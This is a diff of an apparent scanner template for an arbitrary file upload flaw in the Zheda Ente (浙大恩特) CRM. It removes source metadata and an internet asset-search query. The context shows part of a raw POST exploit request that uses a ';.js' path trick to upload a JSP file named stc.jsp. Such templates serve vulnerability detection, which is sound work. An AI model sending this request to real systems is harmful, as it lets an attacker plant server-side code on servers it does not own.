@@ -3,14 +3,8 @@ info:
   name: 浙大恩特CRMmachord_doc任意文件上传漏洞
   author: hacktwo
   severity: high
-  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/0e1ee459f5e64a7c1b748a9c43c3bd52
-
-    [!] 推断说明: 状态码缺失, 推断为 200。原文响应特征为截图, 无法自动提取文本命中条件, 使用前请人工核验。'
+  description: '[!] 推断说明: 状态码缺失, 推断为 200。原文响应特征为截图, 无法自动提取文本命中条件, 使用前请人工核验。'
   tags: file-upload,2025
-  metadata:
-    source: yuque-hacktwo-dtdx2v
-    doc-slug: 0e1ee459f5e64a7c1b748a9c43c3bd52
-    fofa: + hunter`app.name="浙大恩特 CRM"`
 http:
 - raw:
   - 'POST /entsoft_en/Storage/machord_doc.jsp;.js?formID=upload&machordernum&fileName=stc.jsp&strAffixStr&oprfilenam=null&gesnum HTTP/1.1
@@ -47,11 +41,9 @@ http:
     Content-Disposition: form-data; name="strAffixStr"
 
 
-
     --00content0boundary00
 
     Content-Disposition: form-data; name="selfilenam"
-
 
 
     --00content0boundary00
